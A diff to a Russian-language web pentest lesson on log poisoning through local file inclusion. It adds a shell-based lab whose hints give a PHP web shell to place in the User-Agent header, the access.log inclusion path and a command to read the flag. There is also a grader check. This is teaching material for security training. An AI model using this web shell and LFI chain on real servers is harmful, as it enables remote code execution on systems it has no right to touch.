@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 32
 summary: "Log poisoning: запись PHP-кода в логи сервера и исполнение через LFI — access.log, error.log, auth.log, SSH, mail."
+lab:
+  kind: shell
+  title: 'Практика: log poisoning → RCE'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Apache пишет в лог твой заголовок User-Agent — им и отравим лог.'
+    - 'Запиши PHP-шелл в User-Agent: `-A ''<?php system($_GET["c"]); ?>''`.'
+    - 'Включи лог через LFI: `?page=/var/log/apache2/access.log`.'
+    - 'Добавь `&c=cat flag.txt`, запиши ответ в found.txt и набери `check`.'
 ---
 
 В прошлом уроке мы научились включать произвольный файл через LFI. Но была загвоздка: чтобы исполнить код, нужно заставить сервер включить файл, содержимое которого мы контролируем. Где взять такой файл, если загрузки закрыты? Ответ неожиданный: сервер сам пишет такой файл — это **лог**. В него попадают наши заголовки, и если LFI его включит, наш код исполнится.
